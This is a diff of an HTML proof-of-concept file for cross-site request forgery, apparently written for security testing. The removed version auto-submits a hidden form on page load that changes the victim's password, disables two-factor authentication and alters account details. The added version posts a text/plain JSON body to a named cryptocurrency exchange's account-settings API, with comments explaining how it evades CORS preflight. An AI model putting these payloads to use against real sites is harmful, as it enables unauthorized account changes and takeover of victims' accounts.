@@ -1,31 +1,41 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
   <meta charset="utf-8" />
-  <title>CSRF PoC — with token</title>
+  <title>CSRF PoC — manual submit</title>
+  <style>
+    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding: 24px; }
+    .card { border: 1px solid #ddd; padding: 18px; border-radius: 8px; max-width: 720px; }
+    .hint { font-size: 13px; color: #555; margin-top: 12px; }
+    button { padding: 10px 16px; font-size: 15px; border-radius: 6px; cursor: pointer; }
+  </style>
 </head>
-<body onload="document.forms[0].submit()">
-  <!--
-    Replace TOKEN_HERE with the CSRF token value if you captured one.
-    This simulates an attacker who somehow learned the token (or victim reused token).
-  -->
-  <form method="POST" action="/profile/save-account" >
-    <input type="hidden" name="_token" value="TOKEN_HERE">
-    <input type="hidden" name="_currentUrl" value="">
-    <input type="hidden" name="old_password" value="">
-    <input type="hidden" name="new_password" value="Abc123!test">
-    <input type="hidden" name="new_password_confirmation" value="Abc123!test">
-    <input type="hidden" name="two_factor_authentication" value="0">
-    <input type="hidden" name="otp" value="">
-    <input type="hidden" name="address" value="Attacker Address">
-    <input type="hidden" name="password" value="">
-    <input type="hidden" name="login_alerts" value="1">
-    <input type="hidden" name="api_key" value="f95cf73f9f8bf62317e2b17566be04ca8f0e856d">
-    <noscript>
-      <p>JavaScript is disabled — press the button to submit.</p>
-      <button type="submit">Submit</button>
-    </noscript>
-  </form>
+<body>
+  <div class="card">
+    <h2>CSRF PoC — manual submit</h2>
+    <p>
+      Click the button below while the victim is logged in to <code>https://bitso.com</code>
+      to POST the payload to <code>/api/v3/settings/account</code>.
+    </p>
+
+    <form id="csrf-form"
+          method="POST"
+          action="https://bitso.com/api/v3/settings/account"
+          enctype="text/plain">
+      <!-- payload placed as plain text so browser sends Content-Type: text/plain -->
+      <textarea name="data" style="width:100%;height:80px;display:block;margin-bottom:12px;">
+{"slippage_protection_enabled":true}
+      </textarea>
+
+      <!-- visible manual submit button -->
+      <button type="submit">Submit request</button>
+    </form>
+
+    <p class="hint">
+      Note: This form intentionally uses <code>enctype="text/plain"</code> so the browser will send a
+      simple POST (no CORS preflight). It relies on cookie-based session authentication (cookies will be sent automatically).
+      If the server requires <code>Content-Type: application/json</code>, a custom header, or a CSRF token, this will likely fail.
+    </p>
+  </div>
 </body>
 </html>
-
